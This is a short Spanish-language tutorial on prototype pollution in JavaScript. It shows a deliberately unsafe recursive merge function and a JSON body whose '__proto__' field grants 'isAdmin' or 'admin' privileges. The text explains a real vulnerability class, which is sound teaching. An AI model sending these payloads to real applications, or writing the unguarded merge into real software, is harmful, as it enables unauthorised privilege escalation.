### Prototype Pollution

Prototype Pollution es una vulnerabilidad que afecta a ciertos lenguajes de programación como JavaScript, permitiendo la modificación no autorizada del prototipo de objetos. Esto puede llevar a comportamientos inesperados o incluso a vulnerabilidades de seguridad en aplicaciones web y otros sistemas basados en JavaScript. Aquí hay algunos ejemplos ilustrativos de cómo se puede explotar esta vulnerabilidad:

#### 1. Aprovechamiento del merge

El siguiente código muestra cómo un atacante puede aprovechar la función de fusión (merge) para manipular el objeto de destino y asignarle propiedades no deseadas:

```javascript
var merge = function(target, source) {
  for(var attr in source) {
    if(typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
      merge(target[attr], source[attr]);
    } else {
      target[attr] = source[attr];
    }
  }
  return target;
};

var user = {"name": "Juan", "age": 55}
var admin = {"name": "Ernesto", "age": 89, "isAdmin": true}

var body = JSON.parse('{"email": "juan@juan.com", "msg": "Esto es una prueba", "__proto__":{"isAdmin": true}}')

console.log(merge({"ipAddress": "127.0.0.1"}, body))

console.log({}.isAdmin) // Devuelve true, el objeto vacío ha sido contaminado
```

#### 2. Ejemplo gráfico de Prototype Pollution

El siguiente ejemplo muestra cómo un atacante puede modificar el prototipo de un objeto para afectar otros objetos:

```javascript
var user = {}
var admin = {}

user.__proto__.name = "Juan"

var jose = {}

console.log(jose.name) // Devuelve "Juan", el prototipo ha sido modificado
console.log(admin.name) // Devuelve "Juan", afecta a otros objetos con el mismo prototipo
```

#### 3. Ser admin usando la técnica de Prototype Pollution

```json
{
	"email": "test@test.com",
	"msg": "Esto es una prueba",
	"__proto__":{
		"admin":true
	}
}
```

En este ejemplo de datos JSON, se puede observar cómo un atacante podría manipular los datos para establecerse como administrador simplemente agregando la propiedad `"admin": true` al prototipo del objeto. Cuando este objeto se utiliza en la lógica de la aplicación, el atacante obtendría privilegios de administrador de manera no autorizada.

Para obtener más información sobre la Prototype Pollution y su impacto, se puede consultar el artículo [What is Prototype Pollution and Why is it Such a Big Deal](https://medium.com/node-modules/what-is-prototype-pollution-and-why-is-it-such-a-big-deal-2dd8d89a93c).